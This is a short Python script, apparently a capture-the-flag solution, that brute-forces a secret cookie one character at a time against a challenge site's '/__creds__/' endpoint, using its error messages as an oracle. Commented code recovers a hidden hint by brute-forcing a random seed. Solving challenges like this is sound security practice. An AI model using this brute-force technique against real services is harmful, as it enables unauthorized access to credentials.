import requests

url = 'https://challrob1.cyberlog.dev'
endpoint = '/__creds__/bernard-marc'

cookie = {"mycookie": "a"}

caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'*-+"

r = requests.get(url + endpoint, cookies=cookie)
print(r.text)

while True:
     if "is incorrect" in r.text:
         for c in caracteres:
             cookie["mycookie"] = c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
         else:
             print("Char not found")
             break
     elif "Length of cookie do not match" in r.text:
         cookie["mycookie"] += caracteres[0]
         for c in caracteres:
             cookie["mycookie"] = cookie["mycookie"][:-1] + c
             r = requests.get(url + endpoint, cookies=cookie)
             if "is incorrect" not in r.text:
                 print("Found char: " + c)
                 break
     else:
         print("Cookie found: " + cookie["mycookie"])
         print("Flag: " + r.text)
         break


# import random

# random.seed(random.randrange(0, 1337))
# flag = "TODO : Virer les creds sous /__creds__/nom-prenom"
# out = ''.join(random.choices(flag, k=len(flag)*5))
# print(out)

# import random

# output = "D:sc s _rsei e_s-dul is dm  sununT pTe-iisTrs/ODnsopdsdrip/e eosseprn_dem: rccO/mi-nrn dli_cslcsid c_ccsdssoOr  er sOTincps_dnds_ Our_  meO s/mVeo/es_ e orsissT_or cnodcdsclurddeDmV _irem:rmOcrrredoOs :Or_T_eVeVo  r_- Os-esmmr/sp_e_ eo/oDc:/r_ r"
# flag_len = len(output) // 5
# for seed in range(1337):
# random.seed(seed)
# choices = random.choices(list(range(flag_len)), k=len(output))
# flag = [''] * len(output)
# for i, v in enumerate(choices):
#     flag[v] = output[i]
# flag = ''.join(flag)
# if flag.startswith('TODO'):
#     print(flag)
#     break
